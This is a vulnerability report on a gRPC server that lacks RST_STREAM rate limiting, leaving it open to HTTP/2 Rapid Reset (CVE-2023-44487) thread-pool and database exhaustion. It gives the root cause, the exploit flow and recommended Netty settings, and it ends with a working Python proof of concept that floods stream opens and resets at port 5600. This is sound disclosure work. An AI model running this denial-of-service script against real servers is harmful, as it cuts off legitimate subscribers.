### Title
Missing RST_STREAM Rate Limiting Enables HTTP/2 Rapid Reset Resource Exhaustion on gRPC Server

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only `maxConcurrentCallsPerConnection(5)` and a shared executor, but omits all RST_STREAM rate-limiting controls (`maxRstFramesPerWindow`/`maxRstPeriodNanos`), connection age limits, and keepalive settings. An unauthenticated attacker can open streams up to the per-connection limit, immediately send RST_STREAM frames to reset them, and repeat the cycle continuously — causing repeated server-side resource allocation (thread dispatch, DB query initiation, Redis subscription setup) and teardown faster than the executor can drain, exhausting the shared thread pool and degrading topic message delivery for legitimate subscribers.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35 (`grpcServerConfigurer()`):
```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```
`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** The builder customizer applies only two settings. It does not call any of:
- `serverBuilder.maxRstFramesPerWindow(N, durationNanos)` — the Netty-level RST_STREAM rate limiter added specifically to address CVE-2023-44487
- `serverBuilder.maxConnectionAge(...)` / `serverBuilder.maxConnectionAgeGrace(...)`
- `serverBuilder.keepAliveTime(...)` / `serverBuilder.keepAliveTimeout(...)`
- Any per-IP connection cap

A grep across the entire repository for `maxRstFrames`, `maxRstPeriod`, `maxConnectionAge`, `keepAliveTime`, and `flowControlWindow` returns zero matches, confirming none of these protections exist anywhere in the configuration.

**Failed assumption:** The code assumes `maxConcurrentCallsPerConnection = 5` prevents resource abuse. It does not. That setting caps the number of *simultaneously open* streams per connection, but the rapid-reset pattern works by cycling: open 5 streams → send RST_STREAM for all 5 → open 5 more → repeat. Between stream-open and RST_STREAM processing, the gRPC framework dispatches each call to `applicationTaskExecutor`, which may initiate a DB query (via `transactionOperationsReadOnly`) or a Redis subscription. These in-flight operations are not atomically cancelled when RST_STREAM arrives; they must complete or time out independently.

**Exploit flow:**
1. Attacker establishes N TCP connections to port 5600 (no authentication required; the service is public-facing per the Helm chart ingress and docker-compose proxy config).
2. On each connection, attacker opens 5 gRPC streams (e.g., `subscribeTopic` calls), immediately followed by RST_STREAM frames for each.
3. Server dispatches each stream to `applicationTaskExecutor`, begins topic-existence check and DB/Redis setup, then receives RST_STREAM and must unwind.
4. Attacker immediately opens 5 new streams on the same connection, repeating the cycle at wire speed.
5. With N connections × 5 slots × high cycle rate, the `applicationTaskExecutor` thread pool fills with setup/teardown work; DB connection pool (HikariCP) is saturated; Redis subscription overhead accumulates.

### Impact Explanation
The gRPC service's sole purpose is delivering Hedera consensus topic messages to subscribers. Exhausting `applicationTaskExecutor` or the DB connection pool directly blocks legitimate `subscribeTopic` calls from being dispatched or completing, causing message delivery failures or severe latency. The Prometheus alert `GrpcHighDBConnections` (threshold 75%) and `GrpcHighFileDescriptors` (threshold 80%) would eventually fire, but only after the damage is already occurring. There is no circuit-breaker or back-pressure mechanism between the Netty I/O layer and the executor that would shed attacker load before legitimate traffic is affected.

### Likelihood Explanation
The attack requires zero privileges — only network reachability to port 5600 (or port 8080 via the nginx proxy, which passes gRPC traffic directly). The HTTP/2 Rapid Reset technique (CVE-2023-44487) is publicly documented, has published proof-of-concept tooling (e.g., `h2load`, custom HTTP/2 clients), and has been exploited at scale in the wild. A single attacker with a modest network connection can sustain thousands of RST cycles per second. The absence of any RST_STREAM rate limiting, connection age cap, or per-IP limit makes this repeatable and sustainable indefinitely.

### Recommendation
In `grpcServerConfigurer()`, add the following to the `NettyServerBuilder` customization:

```java
// Limit RST_STREAM rate to mitigate CVE-2023-44487 / HTTP/2 Rapid Reset
serverBuilder.maxRstFramesPerWindow(200, TimeUnit.SECONDS.toNanos(30));
// Bound connection lifetime to force periodic reconnection
serverBuilder.maxConnectionAge(5, TimeUnit.MINUTES);
serverBuilder.maxConnectionAgeGrace(30, TimeUnit.SECONDS);
// Detect and close idle connections
serverBuilder.keepAliveTime(2, TimeUnit.MINUTES);
serverBuilder.keepAliveTimeout(20, TimeUnit.SECONDS);
```

Expose `maxRstFramesPerWindow` and `maxRstPeriodNanos` as configurable fields in `NettyProperties` alongside `maxConcurrentCallsPerConnection`. Additionally, deploy a network-layer rate limiter (e.g., Traefik `rateLimit` middleware, already present in the Helm chart) to cap connections per source IP.

### Proof of Concept
```python
# Requires: h2 library or raw HTTP/2 client
# Target: grpc-server:5600 (no TLS in default config)

import socket, h2.connection, h2.config, h2.events

HOST, PORT = "grpc-server", 5600
CYCLES = 10000

conn_sock = socket.create_connection((HOST, PORT))
config = h2.config.H2Configuration(client_side=True)
h2conn = h2.connection.H2Connection(config=config)
h2conn.initiate_connection()
conn_sock.sendall(h2conn.data_to_send())

for _ in range(CYCLES):
    # Open 5 streams (maxConcurrentCallsPerConnection default)
    stream_ids = []
    for i in range(5):
        sid = h2conn.get_next_available_stream_id()
        h2conn.send_headers(sid, [
            (":method", "POST"),
            (":path", "/com.hedera.mirror.api.proto.ConsensusService/subscribeTopic"),
            (":scheme", "http"),
            (":authority", f"{HOST}:{PORT}"),
            ("content-type", "application/grpc"),
            ("te", "trailers"),
        ])
        stream_ids.append(sid)
    conn_sock.sendall(h2conn.data_to_send())

    # Immediately reset all 5 streams
    for sid in stream_ids:
        h2conn.reset_stream(sid)
    conn_sock.sendall(h2conn.data_to_send())

# Observe: server-side thread pool saturation, DB connection exhaustion,
# legitimate subscribeTopic calls begin timing out or being rejected.
```